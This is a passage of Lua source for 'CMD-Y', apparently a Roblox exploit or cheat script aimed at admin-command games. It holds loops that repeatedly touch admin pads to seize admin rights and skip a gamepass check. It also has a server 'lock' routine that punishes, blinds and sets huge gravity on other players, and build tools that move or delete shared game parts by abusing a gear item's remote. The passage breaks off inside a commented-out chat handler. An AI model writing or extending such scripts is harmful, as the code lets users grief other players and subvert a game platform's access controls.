				for _,v in pairs(Cont:GetDescendants()) do
					if v.Name ~= LoadingText.Name and v.Name ~= CO.Name and v.Parent ~= TopBar then
						tweentransparency(v, 0)
					end
				end

				TS:Create(Cont, TweenInfo.new(.23), {BackgroundTransparency = 0}):Play()

				TopBar:TweenSize(UDim2.new(0, 409,0, 29), Enum.EasingDirection.Out, Enum.EasingStyle.Sine, 1, true)
				Rejoin:TweenPosition(UDim2.new(0.870415628, 0, 0.206896558, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Sine, 1, true)
				ServerHop:TweenPosition(UDim2.new(0.792176068, 0, 0.0689655095, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Sine, 1, true)
				CO:TweenPosition(UDim2.new(0.936212778, 0, 0.206896558, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Sine, 1, true)
				TS:Create(CMDLabel, TweenInfo.new(1.5), {TextTransparency = 0}):Play()
			end
		end

		local function slock()
			act("setgrav others 9e9")
			act("punish others")
			act("blind others")
			for _,v in pairs(PlayerService:GetPlayers()) do
				if table.find(whitelist, v.Name) then
					local isBypass,st = bypassattemptcheck(v.Name)
					if isBypass == true then
						act("refresh " .. st)
					else
						act("refresh " .. v.Name)
					end
				end
			end
			if showsm then
				servermsg("[ CMD-Y ] This server is now locked.")
			end
		end



		local function btoolsmove(part, clonepart)
			local loop = false
			if movestatus == false then
				removelimbs()
				task.wait()
				act("size me .5")
				workspace.Gravity = 0
				movestatus = true
				act("gear me 0000000000000000000000000000000000000108158379")
				repeat fwait() until Player.Backpack:FindFirstChild("IvoryPeriastron")
				Player.Backpack:FindFirstChild("IvoryPeriastron").Parent = Player.Character
				local ivory = Player.Character:FindFirstChild("IvoryPeriastron")
				local newcoord = clonepart.CFrame
				loop = true
				task.spawn(function()
					while loop do
						fwait()
						if Player.Character.Torso:FindFirstChild("Weld") then
							Player.Character.Torso:FindFirstChild("Weld"):Destroy()
						end
						PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
						Player.Character.HumanoidRootPart.CFrame = newcoord * CFrame.new(-1*(clonepart.Size.X/2)-(Player.Character.HumanoidRootPart.Size.X/2),0,0)
					end
				end)
				task.wait(.25)
				loop = false
				if not Player.Character:FindFirstChild("IvoryPeriastron") then
					fixgame()
					forcerespawn()
					movestatus = false
					return
				end
				ivory:WaitForChild("Remote"):FireServer(Enum.KeyCode.E)
				task.wait(.25)
				attach(part)
				task.wait(.25)
				if not Player.Character:FindFirstChild("IvoryPeriastron") then
					fixgame()
					forcerespawn()
					movestatus = false
					return
				end
				ivory:WaitForChild("Remote"):FireServer(Enum.KeyCode.E)
				task.wait(.25)
				movestatus = false
			end
		end



		local outsourceversion = 1.56

		local Version = 1.56

		if tonumber(outsourceversion) > Version then
			game.Players.LocalPlayer:Kick("OUTDATED VERSION OF CMD - Y.")
			task.wait(3)
			while true do end
			task.wait(1)
			game:Shutdown()
		elseif tonumber(outsourceversion) < Version then
			game.Players.LocalPlayer:Kick("TAMPERING WITH THE VERSION/GITHUB PAGE HAS AN ERROR")
			task.wait(3)
			while true do end
			task.wait(1)
			game:Shutdown()
		elseif not outsourceversion or not Version then
			game.Players.LocalPlayer:Kick("FAILED TO GET VERSION.")
			task.wait(3)
			while true do end
			task.wait(1)
			game:Shutdown()
		end


		local function loadbtools()
			if Player:FindFirstChild("Backpack") and workspace:FindFirstChild(Player.Name) then
				local Move = Instance.new("Tool", Player.Backpack)
				local Delete = Instance.new("Tool", Player.Backpack)
				local Rotate = Instance.new("Tool", Player.Backpack)
				local Undo = Instance.new("Tool", Player.Backpack)
				local md = false
				local target
				local opticalpart
				Move.Name = "Move"
				Move.RequiresHandle = false

				Move.Equipped:Connect(function(m)
					m.Button1Down:Connect(function()
						if Mouse.Target ~= nil then
							target = Mouse.Target
							opticalpart = target:Clone()
							opticalpart.Transparency = .5
							opticalpart.CanCollide = false
							opticalpart.Parent = workspace
							Mouse.TargetFilter = opticalpart

							md = true
							Mouse.Move:Connect(function()
								if md == true and target ~= nil and opticalpart ~= nil then
									opticalpart.Position = workspace.CurrentCamera.CFrame.Position + (Mouse.Hit.Position - workspace.CurrentCamera.CFrame.Position).Unit * 30
								end
							end)
						end
					end)
					m.Button1Up:Connect(function()
						md = false
						if opticalpart ~= nil then
							if movestatus == true then return end
							if allclear() == false then return end
							for _,v in pairs(game.Workspace:GetDescendants()) do
								if v:IsA("Part") then
									v.CanCollide = false
								end
							end
							btoolsmove(target, opticalpart)
							repeat task.wait() until movestatus == false
							workspace.Gravity = 198.2
							opticalpart:Destroy()
							opticalpart = nil
							for _,v in pairs(game.Workspace:GetDescendants()) do
								if v:IsA("Part") then
									v.CanCollide = true
								end
							end
							act("reset me")
						end
					end)
				end)

				Delete.Name = "Delete"
				Delete.RequiresHandle = false
				Delete.Equipped:Connect(function(m)
					m.Button1Down:Connect(function()
						if movestatus == true then return end
						if allclear() == false then return end
						target = Mouse.Target
						moveobject(target, 1)
						repeat task.wait() until movestatus == false
						workspace.Gravity = 198.2
						act("respawn me")
					end)
				end)

				Undo.Name = "Undo"
				Undo.RequiresHandle = false
				Undo.Equipped:Connect(function(m)
					Undo.Activated:Connect(function()
						local prt = Mouse.Target
						if ogcframes[prt.Name] then
							if movestatus == true then return end
							if allclear() == false then return end
							for _,v in pairs(game.Workspace:GetDescendants()) do
								if v:IsA("Part") then
									v.CanCollide = false
								end
							end
							moveobject(prt, 2)
							repeat task.wait() until movestatus == false
							workspace.Gravity = 198.2
							for _,v in pairs(game.Workspace:GetDescendants()) do
								if v:IsA("Part") then
									v.CanCollide = true
								end
							end
							act("reset me")
						end
					end)
				end)

				Rotate.Name = "Rotate"
				Rotate.RequiresHandle = false
				local selection
				local increment = 1
				local lastCFrame
				local Selectbox = Instance.new("SelectionBox")
				local Lasso = Instance.new("SelectionPartLasso")
				local Handles = Instance.new("ArcHandles")
				Rotate.Equipped:Connect(function()


					Lasso.Humanoid = Player.Character.Humanoid
					Lasso.Parent = Player.PlayerGui
					Lasso.Color = BrickColor.new("Bright blue")

					Handles.Parent = Player.PlayerGui
					Handles.Color = BrickColor.new("Bright orange")

					Selectbox.Parent = Player.PlayerGui
					Selectbox.Color = BrickColor.new("Bright blue")

					local function round(number,by)
						return math.floor((number/by)+0.5) * by
					end

					local function AngleFromAxis(axis,rA)
						rA = math.rad(round(math.deg(rA),increment))
						return axis==Enum.Axis.X and {rA,0,0}
							or axis==Enum.Axis.Y and {0,rA,0}
							or axis==Enum.Axis.Z and {0,0,rA}
					end

					Rotate.Activated:Connect(function()
						selection = Mouse.Target

						if allclear() == true and selection ~= nil and selection:IsA("Part") then
							local fakepart = selection:Clone()
							fakepart.CanCollide = false
							fakepart.Transparency = .5
							fakepart.Anchored = true
							fakepart.Parent = workspace

							Selectbox.Adornee = fakepart
							Handles.Adornee = fakepart
							Lasso.Part = fakepart

							Handles.MouseButton1Down:connect(function(axis)
								if fakepart then
									lastCFrame = fakepart.CFrame
									Handles.Axes = Axes.new(axis)
								end
							end)

							Handles.MouseDrag:connect(function(axis, relativeAngle)
								if fakepart then
									fakepart.CFrame = lastCFrame * CFrame.Angles(unpack(AngleFromAxis(axis,relativeAngle)))
								end
							end)

							Handles.MouseButton1Up:Connect(function(axis, relativeAngle)
								for _,v in pairs(game.Workspace:GetDescendants()) do
									if v:IsA("Part") then
										v.CanCollide = false
									end
								end
								btoolsmove(selection, fakepart)
								repeat fwait() until movestatus == false
								fakepart:Destroy()
								fakepart = nil
								act("refresh me")
								fixgame()
							end)
						end
					end)
				end)

				Rotate.Unequipped:Connect(function()
					Lasso.Humanoid = nil
					Lasso.Parent = nil
					Handles.Parent = nil
					Selectbox.Parent = nil
				end)
			end
		end

		local BtoolsParts = {
			["Deleted"] = {},
			["Moved"] = {},
			["Colors"] = {}
		}
		local ClonedToMove = {}

		local function btoolsv2()
			prompt("Loading BTOOLS v2..")

			local SelectBox = Instance.new("SelectionBox", Player)
			local Handles = Instance.new("Handles", Player)

			local Lasso = Instance.new("SelectionPartLasso")
			local ArcHandle = Instance.new("ArcHandles")

			local Move = Instance.new("Tool", Player.Backpack)
			local Delete = Instance.new("Tool", Player.Backpack)
			local Rotate = Instance.new("Tool", Player.Backpack)
			local Undo = Instance.new("Tool", Player.Backpack)
			local Complete = Instance.new("Tool", Player.Backpack)

			local md = false

			local target
			local opticalpart

			Move.Name = "Move"
			Move.RequiresHandle = false

			Delete.Name = "Delete"
			Delete.RequiresHandle = false

			Rotate.Name = "Rotate"
			Rotate.RequiresHandle = false

			Undo.Name = "Undo"
			Undo.RequiresHandle = false

			Complete.Name = "Complete"
			Complete.RequiresHandle = false

			local function IsDescendantOfPlayer(part)
				for i,v in pairs(PlayerService:GetPlayers()) do
					if v:FindFirstChild("Character") and part:IsDescendantOf(v.Character) then
						return true
					else
						return false
					end
				end
			end

			local function IsInTable(part, tbl)
				if tbl[part] or table.find(tbl, part) then
					return true
				end
			end

			local function IsBeingMoved(part)
				if IsInTable(part, BtoolsParts.Deleted) then
					prompt("This part is being deleted. Use undo tool to undo!")
					return true,1
				elseif not IsInTable(part, BtoolsParts.Moved) and not string.find(part.Name, "(Clone)") then
					return false,2
				elseif IsInTable(part, BtoolsParts.Moved) and not string.find(part.Name, "(Clone)") then
					prompt("This part is already being moved!")
					return true,3
				elseif string.find(part.Name, "(Clone)") then
					return true,4
				elseif IsInTable(part, BtoolsParts.Deleted)  then
					prompt("This part is being deleted, use undo tool to undo!")
					return true,1
				end
			end

			local MACon

			Move.Equipped:Connect(function()
				MACon = Move.Activated:Connect(function()
					selection = Mouse.Target
					if selection and selection:IsA("Part") and not IsDescendantOfPlayer(selection) and selection ~= Handles then
						local newpart
						local IsPartBeingMoved,t = IsBeingMoved(selection)
						if not IsPartBeingMoved then
							newpart = selection:Clone()
							newpart.CanCollide = false
							newpart.Parent = workspace
							newpart.Transparency = 0.5
							newpart.Name = newpart.Name .. " (Clone)"
							BtoolsParts.Moved[selection] = {
								ClonePart = newpart,
								Part = selection
							}
						else
							if IsPartBeingMoved and t == 4 then
								newpart = selection
							end
						end
						if newpart then
							SelectBox.Parent = Player.PlayerGui
							SelectBox.Adornee = newpart

							Handles.Adornee = newpart
							Handles.Parent = Player.PlayerGui
							Handles.Style = Enum.HandlesStyle.Movement

							local AxisMultipliers = {
								[Enum.NormalId.Top] = Vector3.new(0, 1, 0);
								[Enum.NormalId.Bottom] = Vector3.new(0, -1, 0);
								[Enum.NormalId.Front] = Vector3.new(0, 0, -1);
								[Enum.NormalId.Back] = Vector3.new(0, 0, 1);
								[Enum.NormalId.Left] = Vector3.new(-1, 0, 0);
								[Enum.NormalId.Right] = Vector3.new(1, 0, 0);
							}

							MinX, MinY, MinZ = Handles.Adornee.Position.X, Handles.Adornee.Position.Y, Handles.Adornee.Position.Z;
							MaxX, MaxY, MaxZ = Handles.Adornee.Position.X, Handles.Adornee.Position.Y, Handles.Adornee.Position.Z;

							Handles.MouseButton1Down:Connect(function()
								Handles.MouseDrag:Connect(function(face,dist)
									Handles.Adornee.CFrame = CFrame.new(
										MinX + (MaxX - MinX) / 2,
										MinY + (MaxY - MinY) / 2,
										MinZ + (MaxZ - MinZ) / 2
									) + (AxisMultipliers[face] * dist)
								end)
							end)

							Handles.MouseButton1Up:Connect(function()
								MinX, MinY, MinZ = Handles.Adornee.Position.X, Handles.Adornee.Position.Y, Handles.Adornee.Position.Z;
								MaxX, MaxY, MaxZ = Handles.Adornee.Position.X, Handles.Adornee.Position.Y, Handles.Adornee.Position.Z;
							end)
						end
					end
				end)

				Move.Unequipped:Connect(function()
					if MACon then
						MACon:Disconnect()
					end
					Handles.Parent = Player
					SelectBox.Parent = Player
				end)
			end)

			local DACon

			Delete.Equipped:Connect(function()
				DACon = Delete.Activated:Connect(function()
					selection = Mouse.Target
					if selection and selection:IsA("Part") and not IsDescendantOfPlayer(selection) then
						if IsInTable(selection, BtoolsParts.Deleted)  then
							prompt("This part is already being deleted. Use undo tool to undo")
						else
							if string.find(selection.Name, "(Clone)") then
								local b = selection.Name:gsub(" (Clone)","")
								local n
								for i,v in pairs(workspace:GetDescendants()) do
									if v.Name == b then
										n = v
									end
								end
								BtoolsParts.Moved[n] = nil
								selection:Destroy()
							elseif IsInTable(selection, BtoolsParts.Moved) and not string.find(selection.Name, "(Clone)") then
								prompt("This part is being moved, undo using the undo tool then try destroying!")
							elseif not IsInTable(selection, BtoolsParts.Moved) and not IsInTable(selection, BtoolsParts.Deleted)  then
								BtoolsParts.Colors[selection.Name] = selection.BrickColor
								selection.BrickColor = BrickColor.Red()
								table.insert(BtoolsParts.Deleted, selection)
							end
						end
					end
				end)
			end)

			Delete.Unequipped:Connect(function()
				if DACon then
					DACon:Disconnect()
				end
			end)

			local RACon
			local increment = 1
			local ArcMD
			local ArcU
			local ArcD

			local function round(number,by)
				return math.floor((number/by)+0.5) * by
			end

			local function AngleFromAxis(axis,rA)
				rA = math.rad(round(math.deg(rA),increment))
				return axis==Enum.Axis.X and {rA,0,0}
					or axis==Enum.Axis.Y and {0,rA,0}
					or axis==Enum.Axis.Z and {0,0,rA}
			end

			Rotate.Equipped:Connect(function()

				Lasso.Humanoid = Player.Character.Humanoid
				Lasso.Parent = Player.PlayerGui
				Lasso.Color = BrickColor.new("Bright blue")

				ArcHandle.Parent = Player.PlayerGui
				ArcHandle.Color = BrickColor.new("Bright orange")

				SelectBox.Parent = Player.PlayerGui
				SelectBox.Color = BrickColor.new("Bright blue")
				if Lasso.Part then
					ArcHandle.Adornee = Lasso.Part
					SelectBox.Adornee = Lasso.Part

					ArcD = ArcHandle.MouseButton1Down:connect(function(axis)
						if Lasso.Part then
							lastCFrame = Lasso.Part.CFrame
							--ArcHandle.Axes = Axes.new(axis)
						end
					end)

					ArcMD = ArcHandle.MouseDrag:connect(function(axis, relativeAngle)
						if Lasso.Part then
							Lasso.Part.CFrame = lastCFrame * CFrame.Angles(unpack(AngleFromAxis(axis,relativeAngle)))
						end
					end)

					ArcU = ArcHandle.MouseButton1Up:Connect(function(axis, relativeAngle)
						lastCFrame = Lasso.Part.CFrame
					end)

					RACon = Rotate.Activated:Connect(function()
						local lastCFrame
						selection = Mouse.Target
						if selection and selection:IsA("Part") and not IsDescendantOfPlayer(selection) and selection ~= Handles then
							local newpart
							local IsPartBeingMoved,t = IsBeingMoved(selection)
							if not IsPartBeingMoved then
								newpart = selection:Clone()
								newpart.CanCollide = false
								newpart.Parent = workspace
								newpart.Transparency = 0.5
								newpart.Name = newpart.Name .. " (Clone)"
								BtoolsParts.Moved[selection] = {
									ClonePart = newpart,
									Part = selection
								}
							else
								if IsPartBeingMoved and t == 4 then
									newpart = selection
								end
							end
							if newpart then
								Lasso.Part = newpart
								ArcHandle.Adornee = Lasso.Part
								SelectBox.Adornee = Lasso.Part

								ArcD = ArcHandle.MouseButton1Down:connect(function(axis)
									if Lasso.Part then
										lastCFrame = Lasso.Part.CFrame
										--ArcHandle.Axes = Axes.new(axis)
									end
								end)

								ArcMD = ArcHandle.MouseDrag:connect(function(axis, relativeAngle)
									if Lasso.Part then
										Lasso.Part.CFrame = lastCFrame * CFrame.Angles(unpack(AngleFromAxis(axis,relativeAngle)))
									end
								end)

								ArcU = ArcHandle.MouseButton1Up:Connect(function(axis, relativeAngle)
									lastCFrame = Lasso.Part.CFrame
								end)
							end
						end
					end)
				else
					RACon = Rotate.Activated:Connect(function()
						local lastCFrame
						selection = Mouse.Target
						if selection and selection:IsA("Part") and not IsDescendantOfPlayer(selection) and selection ~= Handles then
							local newpart
							local IsPartBeingMoved,t = IsBeingMoved(selection)
							if not IsPartBeingMoved then
								newpart = selection:Clone()
								newpart.CanCollide = false
								newpart.Parent = workspace
								newpart.Transparency = 0.5
								newpart.Name = newpart.Name .. " (Clone)"
								BtoolsParts.Moved[selection] = {
									ClonePart = newpart,
									Part = selection
								}
							else
								if IsPartBeingMoved and t == 4 then
									newpart = selection
								end
							end
							if newpart then
								Lasso.Part = newpart
								ArcHandle.Adornee = Lasso.Part
								SelectBox.Adornee = Lasso.Part

								ArcD = ArcHandle.MouseButton1Down:connect(function(axis)
									if Lasso.Part then
										lastCFrame = Lasso.Part.CFrame
									end
								end)

								ArcMD = ArcHandle.MouseDrag:connect(function(axis, relativeAngle)
									if Lasso.Part then
										Lasso.Part.CFrame = lastCFrame * CFrame.Angles(unpack(AngleFromAxis(axis,relativeAngle)))
									end
								end)

								ArcU = ArcHandle.MouseButton1Up:Connect(function(axis, relativeAngle)
									lastCFrame = Lasso.Part.CFrame
								end)
							end
						end
					end)
				end
			end)

			Rotate.Unequipped:Connect(function()
				Lasso.Parent = Player
				ArcHandle.Parent = Player
				SelectBox.Parent = Player
				if RACon then
					RACon:Disconnect()
				end
				if ArcD then
					ArcD:Disconnect()
				end
				if ArcU then
					ArcU:Disconnect()
				end
				if ArcMD then
					ArcMD:Disconnect()
				end
			end)

			local UNCon

			Undo.Equipped:Connect(function()
				UNCon = Undo.Activated:Connect(function()
					local selection = Mouse.Target
					if selection and selection:IsA("Part") and not IsDescendantOfPlayer(selection) then
						if IsInTable(selection, BtoolsParts.Deleted) then
							selection.BrickColor = BtoolsParts.Colors[selection.Name]
							table.remove(BtoolsParts.Deleted, table.find(BtoolsParts.Deleted, selection))
						else
							if string.find(selection.Name, "(Clone)") then
								local b = selection.Name:gsub(" (Clone)","")
								local n
								for i,v in pairs(workspace:GetDescendants()) do
									if v.Name == b then
										n = v
									end
								end
								BtoolsParts.Moved[n] = nil
								selection:Destroy()
							elseif IsInTable(selection, BtoolsParts.Moved) and not string.find(selection.Name, "(Clone)") then
								BtoolsParts.Moved[selection] = nil
								workspace[selection["ClonePart"].Name]:Destroy()
							elseif not IsInTable(selection, BtoolsParts.Moved) and not IsInTable(selection, BtoolsParts.Deleted) then
								if ogcframes[selection.Name] then
									if movestatus == true then return end
									if allclear() == false then return end
									for _,v in pairs(game.Workspace:GetDescendants()) do
										if v:IsA("Part") then
											v.CanCollide = false
										end
									end

									moveobject(selection, 2)
									repeat task.wait() until movestatus == false
									workspace.Gravity = 198.2
									for _,v in pairs(game.Workspace:GetDescendants()) do
										if v:IsA("Part") then
											v.CanCollide = true
										end
									end
									act("reset me")
								end
							end
						end
					end
				end)
			end)

			Undo.Unequipped:Connect(function()
				if UNCon then
					UNCon:Disconnect()
				end
			end)

			local function lenTbl(tbl)
				local num = 0
				for i,v in next, tbl do
					num += 1
				end
				return num
			end

			Complete.Equipped:Connect(function()
				COCon = Complete.Activated:Connect(function()
					if lenTbl(BtoolsParts.Moved) > 0 or lenTbl(BtoolsParts.Deleted) > 0 then
						for i,v in pairs(Player.Backpack:GetChildren()) do
							if v.Name ~= "Complete" then
								v:Destroy()
							end
						end
						for _,v in pairs(game.Workspace:GetDescendants()) do
							if v:IsA("Part") then
								v.CanCollide = false
							end
						end

						for i,v in pairs(BtoolsParts.Moved) do
							pcall(function()
								if v then
									btoolsmove(v["Part"], v["ClonePart"])
									repeat task.wait() until movestatus == false
									act("reset me")
									local g,c = pcall(function()
										if v then
											workspace[v["ClonePart"].Name]:Destroy()
											BtoolsParts.Moved[v["Part"]] = nil
										end
									end)

									if not g then
										print(c)
									end
									fixgame()
								end
							end)

						end
						repeat task.wait() until movestatus == false
						for i,v in pairs(BtoolsParts.Deleted) do
							pcall(function()
								if v then
									moveobject(v, 1) 
									repeat task.wait() until movestatus == false
									act("reset me")
									fixgame()
									table.remove(BtoolsParts.Deleted, table.find(BtoolsParts.Deleted, v))
								end
							end)
						end
						repeat task.wait() until movestatus == false
						COCon:Disconnect()
					else
						prompt("Move around some parts first!")
					end
				end)
			end)

			Complete.Unequipped:Connect(function()
				if COCon then
					COCon:Disconnect()
				end
			end)

			local ClearTables = Instance.new("Tool", Player.Backpack)
			ClearTables.Name = "Clear"
			ClearTables.RequiresHandle = false

			local CAD

			ClearTables.Equipped:Connect(function()
				CAD = ClearTables.Activated:Connect(function()
					BtoolsParts.Moved = {}
					BtoolsParts.Deleted = {}
					for i,v in pairs(workspace:GetDescendants()) do
						if table.find(BtoolsParts.Colors, v) then
							v.BrickColor = BtoolsParts.Colors[v]
						end
					end
					BtoolsParts.Colors = {}
					for i,v in pairs(workspace:GetChildren()) do
						if string.find(v.Name, "(Clone)") then
							v:Destroy()
						end
					end
					prompt("BTOOLSv2 tables and parts cleared!")
					CAD:Disconnect()
				end)
			end)


		end

		local function clientloadpos(c)
			PlayerService.LocalPlayer.Character.Parent = workspace
			PlayerService.LocalPlayer.Character.HumanoidRootPart.CFrame = c
		end

		local function load()
			LoadingText.Text = "Loading.. (Checking files..)"
			--checkfiles()
			tweentransparency(CMDLabel, 0)
			CMDLabel:TweenPosition(UDim2.new(0.5, 0,0.299, 0))
			task.wait(.5)
			TS:Create(LoadingText, TweenInfo.new(0.1), {TextTransparency = 0}):Play()
			LoadingText.Text = "Starting..."
			task.wait()
			LoadingText.Text = "Loading.. (Getting Pads...)"
			task.wait()
			for _,pad in pairs(Pads) do
				LoadingText.Text = "Loading.. (Pads: " .. PadAmt .. ")"
				task.wait()
				if pad:FindFirstChildOfClass("Part") then
					PadAmt = PadAmt + 1
				end
			end
			LoadingText.Text = "Loading.. (Found " .. PadAmt .. " pads!)"
			task.wait()
			LoadingText.Text = "Loading.. (Attempting to get admin...)"
			if PadAmt > 1 then
				LoadingText.Text = "Loading.. (Picking a pad..)"
				task.wait()
				LoadingText.Text = "Loading.. (Pad picked!)"
			else
				task.wait()
				LoadingText.Text = "Loading.. (Not enough pads. No admin given)"
			end
			task.wait(.15)
			LoadingText.Text = "Loaded!"
			tweentransparency(LoadingText, 1)
		end


		task.spawn(function()
			if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(Player.UserId,66254) then
				return
			end
			while true do
				task_wait()
				if workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart") then
					touchpad(PermPad)
				end
			end
		end)

		task.spawn(function()
			while true do 
				task_wait()
				if LoopGrab then
					if workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart") then
						regen()
						for _,v in pairs(Pads) do
							touchpad(v)
						end
					end
				end
			end
		end)

		--Playeradded, ChildAdded, Chatted,  etc
		PlayerService.PlayerAdded:Connect(function(plr)
			if table.find(UntouchedPlayers, plr.UserId) then
				if showsm then
					servermsg("[ CMD-Y ] A very epic player has joined: | " .. plr.Name .. " |")
				end
			end
			local isBypass1,st1 = bypassattemptcheck(plr.Name)
			if isBypass1 and bypassban then
				bl(plr.Name)
			end
			if PlrsAdmin == true and Protection == false then
				if not table.find(permblacklist, plr.Name) and not table.find(blacklist, plr.Name) then
					if showsm then
						act("pm " .. plr.Name .. " \n\n [ CMD-Y ] \n\n Welcome, " .. plr.Name .. " \n\n Perm is on in this server. Chat any command.")
					end
				end
			elseif PlrsAdmin == true and Protection == true then
				if not table.find(permblacklist, plr.Name) and not table.find(blacklist, plr.Name) then
					if showsm then
						act("pm " .. plr.Name .. " \n\n [ CMD-Y ] \n\n Welcome, " .. plr.Name .. " \n\n This server is protected by CMD-Y. \n\n Perm is on in this server. Chat any command.")
					end
				end
			elseif PlrsAdmin == false and Protection == true then
				if not table.find(blacklist, plr.Name) then
					if showsm then
						act("pm " .. plr.Name .. " \n\n [ CMD-Y ] \n\n Welcome, " .. plr.Name .. " \n\n This server is protected by CMD-Y.")
					end
				end
			end

			if not PlayersP.PlrList:FindFirstChild(plr.DisplayName) then
				local newplr = Cont.Player:Clone()
				local img, ready = PlayerService:GetUserThumbnailAsync(plr.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
				newplr.Label.Text = plr.DisplayName
				newplr.Image = img
				newplr.Name = plr.Name
				if plr.Name == PlayerService.LocalPlayer.Name then
					newplr.Dropdown:Destroy()
					newplr.Label.Text = "You"
				elseif table.find(UntouchedPlayers, plr.UserId) then
					newplr.Dropdown:Destroy()
					newplr.Label.Text = "* " .. plr.DisplayName
				else
					newplr.Dropdown.MouseButton1Click:Connect(function()
						CurrentPlayer = plr.Name
						Tabs.Drop.PlayerMenu.Unperm.Text = "Unperm"
						Tabs.Drop.PlayerMenu.Whitelist.Text = "Whitelist"
						Tabs.Drop.PlayerMenu.Blacklist.Text = "Blacklist"
						Tabs.Drop.PlayerMenu.Padban.Text = "Padban"
						if table.find(whitelist, CurrentPlayer) then
							Tabs.Drop.PlayerMenu.Whitelist.Text = "Unwhitelist"
						end
						if table.find(blacklist, CurrentPlayer) then
							Tabs.Drop.PlayerMenu.Blacklist.Text = "Unblacklist"
						end
						if table.find(permblacklist, CurrentPlayer) then
							Tabs.Drop.PlayerMenu.Unperm.Text = "RePerm"
						end
						if table.find(padbanned, CurrentPlayer) then
							Tabs.Drop.PlayerMenu.Padban.Text = "Unpadban"
						end

						Tabs.Drop.BackgroundTransparency = 1
						Tabs.Drop.PlayerMenu.BackgroundTransparency = 1
						Tabs.Drop.PlayerMenu.Player.Image = newplr.Image
						Tabs.Drop.Visible = true
						Tabs.Drop.PlayerMenu.Visible = true
						TS:Create(Tabs.Drop, TweenInfo.new(.4), {BackgroundTransparency = 0.15}):Play()
						TS:Create(Tabs.Drop.PlayerMenu, TweenInfo.new(.4), {BackgroundTransparency = 0}):Play()
					end)
				end
				newplr.Parent = PlayersP.PlrList
			end
		end)



		for _,plr in pairs(PlayerService:GetPlayers()) do
			plr.Chatted:Connect(function(msg)

				local newtext = CMDY.ChatLog:Clone()
				if Admin.Pads:FindFirstChild(plr.Name .. "'s admin") then
					local msms = msg:split(" ")
					if table.find(kohlscmdslist.cmdnames, string.lower(msms[1])) or table.find(kohlscmdslist.aliases, string.lower(msms[1])) then
						local sd = CMDY.SilentLogsBar.SilentLogsFrame.SilentLogsScrollingFrame:GetChildren()
						newtext.Text = plr.Name .. ": " .. msg
						newtext.Parent = CMDY.SilentLogsBar.SilentLogsFrame.SilentLogsScrollingFrame
						local alls = 0
						for i,v in pairs(CMDY.SilentLogsBar.SilentLogsFrame.SilentLogsScrollingFrame:GetChildren()) do
							if not v:IsA("UIListLayout") and v then
								alls = v.Size.Y.Offset + alls
							end
							if not v:IsA("UIListLayout") and not v then
								alls = 0
							end
						end
						CMDY.SilentLogsBar.SilentLogsFrame.SilentLogsScrollingFrame.CanvasSize = UDim2.new(0,0,0,alls+newtext.TextBounds.Y)
						CMDY.SilentLogsBar.SilentLogsFrame.SilentLogsScrollingFrame.CanvasPosition = Vector2.new(0,CMDY.SilentLogsBar.SilentLogsFrame.SilentLogsScrollingFrame.CanvasPosition.Y+newtext.TextBounds.Y)
					end
				end

			end)
		end

	--[[PlayerService.PlayerAdded:Connect(function(plr)
		plr.Chatted:Connect(function(msg)
			print("xd")
			local isBypass,st = bypassattemptcheck(plr.Name)
			if Protection == true then
				if string.find(msg, "94794847") then
					if isBypass == true then
						act("removetools " .. st)
						act("unsize " .. st)
					else
						act("removetools " .. plr.Name)
						act("unsize " .. plr.Name)
					end
				elseif string.find(msg, "size ") and not string.find(msg, "unsize") then
					task.spawn(function()
						if isBypass == true then
							for i = 1,15 do
								act("refresh "  .. st)
							end
						else
							for i = 1,15 do
								act("refresh " .. plr.Name)
							end
						end
					end)
				end
			end
			if PlrsAdmin == true then
				print("fr")
				if plr.Name ~= Player.Name and not table.find(whitelist, plr.Name) then
					if string.find(msg, "#") then
						if isBypass == true then
							act("pm " .. st .. "\n\n [ CMD-Y ] \n\n Your message was tagged, therefore your command was not executed.")
						else
							act("pm " .. plr.Name .. "\n\n [ CMD-Y ] \n\n Your message was tagged, therefore your command was not executed.")
						end
					end
					if table.find(permblacklist, plr.Name) or table.find(blacklist, plr.Name) or table.find(padbanned, plr.Name) then
						if isBypass == true then
							act("pm " .. st .. "\n\n [ CMD-Y ] \n\n You are blacklisted from Perm Admin. Sorry not sorry.")
						else
							act("pm " .. plr.Name .. "\n\n [ CMD-Y ] \n\n You are blacklisted from Perm Admin. Sorry not sorry.")
						end
					else
						print("lol")
						if isBypass == true then
							local newmsg = msg:gsub(" me", " " .. st):gsub(" all", " " .. st):gsub(" others", " " .. st)
							for _,v in pairs(cmds.blacklisted) do
								if string.find(newmsg, v) then
									act("pm " .. st .. "\n\n [ CMD-Y ] \n\n Blacklisted command.")
								else
									act(newmsg)
								end
							end
						else
							local newmsg = msg:gsub(" me", " " .. plr.Name):gsub(" all", " " .. plr.Name):gsub(" others", " " .. plr.Name)
							for _,v in pairs(cmds.blacklisted) do
								if string.find(newmsg, v) then
									act("pm " .. plr.Name .. "\n\n [ CMD-Y ] \n\n Blacklisted command.")
								else
									act(newmsg)
								end
							end
						end
					end
				end
			end
	
			local newtext = CMDY.ChatLog:Clone()
			if Admin.Pads:FindFirstChild(plr.Name .. "'s admin") then
				local msms = msg:split(" ")
				if table.find(kohlscmdslist.cmdnames, string.lower(msms[1])) or table.find(kohlscmdslist.aliases, string.lower(msms[1])) then
					local sd = CMDY.SilentLogsBar.SilentLogsFrame.SilentLogsScrollingFrame:GetChildren()
					newtext.Text = plr.Name .. ": " .. msg
					newtext.Parent = CMDY.SilentLogsBar.SilentLogsFrame.SilentLogsScrollingFrame
					local alls = 0
					for i,v in pairs(CMDY.SilentLogsBar.SilentLogsFrame.SilentLogsScrollingFrame:GetChildren()) do
						if not v:IsA("UIListLayout") and v then
							alls = v.Size.Y.Offset + alls
						end
						if not v:IsA("UIListLayout") and not v then
							alls = 0
						end
					end
					CMDY.SilentLogsBar.SilentLogsFrame.SilentLogsScrollingFrame.CanvasSize = UDim2.new(0,0,0,alls+newtext.TextBounds.Y)
